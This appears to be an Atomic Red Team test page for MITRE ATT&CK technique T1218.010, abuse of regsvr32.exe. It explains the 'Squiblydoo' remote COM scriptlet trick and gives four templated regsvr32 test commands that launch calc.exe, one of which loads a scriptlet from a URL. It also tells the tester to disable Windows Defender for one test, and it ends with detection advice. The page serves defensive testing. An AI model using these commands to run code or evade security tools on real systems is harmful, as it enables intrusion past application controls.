# T1218.010 - Signed Binary Proxy Execution: Regsvr32
Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. (Citation: Microsoft Regsvr32)

Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Regsvr32 local COM scriptlet execution
Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
regsvr32.exe /s /u /i:#{filename} scrobj.dll
```

Invoke-AtomicTest T1218.010 -TestNumbers 1

### Atomic Test #2 - Regsvr32 remote COM scriptlet execution
Regsvr32.exe is a command-line program used to register and unregister OLE controls. This test may be blocked by windows defender; disable
windows defender real-time protection to fix it. Upon execution, calc.exe will be launched.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
regsvr32.exe /s /u /i:#{url} scrobj.dll
```

Invoke-AtomicTest T1218.010 -TestNumbers 2

### Atomic Test #3 - Regsvr32 local DLL execution
Regsvr32.exe is a command-line program used to register and unregister OLE controls. Upon execution, calc.exe will be launched.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
IF "%PROCESSOR_ARCHITECTURE%"=="AMD64" (C:\Windows\syswow64\regsvr32.exe /s #{dll_name}) ELSE ( regsvr32.exe /s #{dll_name} )
```

Invoke-AtomicTest T1218.010 -TestNumbers 3

### Atomic Test #4 - Regsvr32 Registering Non DLL
Replicating observed Gozi maldoc behavior registering a dll with an altered extension

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
regsvr32 /s #{dll_file}
```

Invoke-AtomicTest T1218.010 -TestNumbers 4

## Detection
Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)